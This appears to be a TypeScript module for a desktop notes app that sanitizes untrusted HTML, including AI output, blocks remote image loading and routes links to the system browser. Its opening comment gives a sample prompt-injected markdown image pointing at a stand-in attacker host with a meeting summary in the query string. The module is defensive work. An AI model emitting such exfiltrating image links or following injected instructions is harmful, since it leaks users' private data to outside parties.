/* Rules for rendering untrusted content (AI output, imported notes,
   transcripts). Two leaks to close:
   - Remote images load on render with no click, so a prompt-injected
     `![](https://attacker/?d=<meeting summary>)` would exfiltrate data.
     Only local/inline image sources are allowed.
   - Links must never navigate the app window itself; they open in the
     system browser after a scheme check. */

import DOMPurify from "dompurify";
import { invoke } from "@tauri-apps/api/core";

/** Image/media sources that never leave the machine. */
export function isSafeMediaSrc(src: string | null | undefined): boolean {
  if (!src) return false;
  const s = src.trim().toLowerCase();
  return (
    /^data:image\/(png|jpe?g|gif|webp|avif|bmp);/.test(s) ||
    s.startsWith("asset:") ||
    s.startsWith("http://asset.localhost/") ||
    s.startsWith("https://asset.localhost/") ||
    s.startsWith("blob:")
  );
}

/** Link targets we are willing to hand to the OS. */
export function isSafeExternalHref(href: string | null | undefined): href is string {
  if (!href) return false;
  try {
    const u = new URL(href);
    return u.protocol === "https:" || u.protocol === "http:" || u.protocol === "mailto:";
  } catch {
    return false;
  }
}

/** Open a link in the user's default browser (validated again in Rust). */
export function openExternal(href: string): void {
  if (!isSafeExternalHref(href)) return;
  void invoke("open_external_url", { url: href }).catch(() => {
    /* not running inside Tauri (dev mock) or rejected: do nothing */
  });
}

/** Capture-phase guard: any click on an `<a href>` anywhere in the app opens
 *  externally (or not at all) instead of navigating the app window. */
export function installLinkGuard(): void {
  const anchorOf = (e: Event) => {
    const target = e.target as Element | null;
    const a = target?.closest?.("a[href]") as HTMLAnchorElement | null;
    const href = a?.getAttribute("href") ?? "";
    return a && !href.startsWith("#") ? { a, href } : null;
  };
  document.addEventListener(
    "click",
    (e) => {
      const hit = anchorOf(e);
      if (!hit) return; // in-page `#` anchors are harmless
      e.preventDefault();
      // In the notes editor a plain click places the caret; follow links only
      // with Ctrl/Cmd there, like other editors.
      if (hit.a.closest("[contenteditable='true']") && !(e.ctrlKey || e.metaKey)) return;
      // The raw attribute, not `a.href`: a relative href would otherwise
      // resolve against the app's own origin and look like a web link.
      openExternal(hit.href);
    },
    true,
  );
  // Middle-click asks for a new window; never let the webview open one.
  document.addEventListener(
    "auxclick",
    (e) => {
      if (anchorOf(e)) e.preventDefault();
    },
    true,
  );
}

/** Attribute on the placeholder that stands in for a blocked remote image. */
export const BLOCKED_IMG_ATTR = "data-blocked-img";

let hooksInstalled = false;
// Original src of images whose src gets stripped, for the placeholder.
const original = new WeakMap<Element, string>();

/** DOMPurify with remote-loading attributes stripped. */
export function sanitizeHtml(html: string): string {
  if (!hooksInstalled) {
    hooksInstalled = true;
    DOMPurify.addHook("afterSanitizeAttributes", (node) => {
      if (node.tagName === "IMG") {
        // Remember any original src (whatever its scheme) so the placeholder
        // can round-trip it back to markdown unchanged.
        const src = node.getAttribute("src");
        if (src) original.set(node, src);
      }
      for (const attr of ["src", "poster"]) {
        const v = node.getAttribute?.(attr);
        if (v != null && !isSafeMediaSrc(v)) node.removeAttribute(attr);
      }
      // SVG-style references (<image href>, <use xlink:href>) can fetch too.
      if (node.tagName !== "A") {
        for (const attr of ["href", "xlink:href"]) {
          const v = node.getAttribute?.(attr);
          if (v != null && !isSafeMediaSrc(v)) node.removeAttribute(attr);
        }
      }
      if (node.tagName === "IMG" && !node.getAttribute("src")) {
        // Swap for an inert placeholder that keeps the original URL, so the
        // markdown round-trip (turndown) restores `![alt](url)` losslessly.
        const alt = node.getAttribute("alt") ?? "";
        const ph = document.createElement("span");
        ph.setAttribute(BLOCKED_IMG_ATTR, original.get(node) ?? "");
        ph.setAttribute("data-alt", alt);
        ph.setAttribute("title", "Remote image not loaded (privacy)");
        ph.textContent = alt ? `[image: ${alt}]` : "[image]";
        node.replaceWith(ph);
        return;
      }
      if (node.tagName === "A") {
        const href = node.getAttribute("href");
        if (href && !href.startsWith("#") && !isSafeExternalHref(href)) {
          node.removeAttribute("href");
        }
        node.removeAttribute("target");
      }
    });
  }
  return DOMPurify.sanitize(html, {
    // Inline styles can carry `url(...)` beacons; srcset bypasses the src check.
    FORBID_ATTR: ["style", "srcset", "ping", "background", "formaction"],
    // <style> can @import / url() remote resources; notes never need SVG/MathML.
    FORBID_TAGS: [
      "style",
      "svg",
      "math",
      "video",
      "audio",
      "source",
      "track",
      "picture",
      "form",
      "iframe",
      "object",
      "embed",
    ],
  });
}
